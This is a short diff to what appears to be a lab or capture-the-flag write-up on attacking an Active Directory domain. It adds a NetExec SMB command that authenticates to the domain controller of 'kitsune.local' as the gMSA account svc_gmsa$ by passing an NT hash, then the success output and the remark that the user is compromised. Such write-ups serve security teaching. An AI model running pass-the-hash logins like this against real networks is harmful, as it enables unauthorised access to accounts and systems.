@@ -440,7 +440,13 @@ LDAP        10.1.176.128    389    DC01             Account: svc_gmsa$          
 Ill read the value
 
 ```python
-
+❯❯❯ nxc smb dc01.kitsune.local -u 'svc_gmsa$' -H '085691c182d60ab1a12466ce7b50d29d' 
+SMB         10.1.176.128    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.1.176.128    445    DC01             [+] kitsune.local\svc_gmsa$:085691c182d60ab1a12466ce7b50d29d
 ```
+
+This user is now compromised!
+
+
 
 
